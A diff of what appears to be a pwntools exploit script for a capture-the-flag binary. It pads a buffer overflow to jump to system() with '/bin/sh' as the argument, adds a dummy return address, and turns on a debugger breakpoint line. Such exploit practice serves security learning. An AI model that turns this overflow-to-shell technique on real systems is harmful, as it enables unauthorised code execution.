@@ -55,7 +55,7 @@ satck = 0x4040E0+0x100
 offset = 282
 payload = ''
 payload += 'A'*offset
-payload += p64(system)
+payload += p64(system) + p64(0xdeadbeef)
 payload = payload.ljust(1000,'\0')
 
 # auth flag = 1
@@ -68,7 +68,7 @@ sla(' > ','1')
 sla('  Input username: ','/bin/sh;'+'b'*1000)
 
 sla(' > ','2')
-# debug('b *0x4015A1\nb *0x040121A')
+debug('b *0x4015A1\nb *0x040121A')
 sla('  Command to execute: ',payload)
 
 p.interactive()
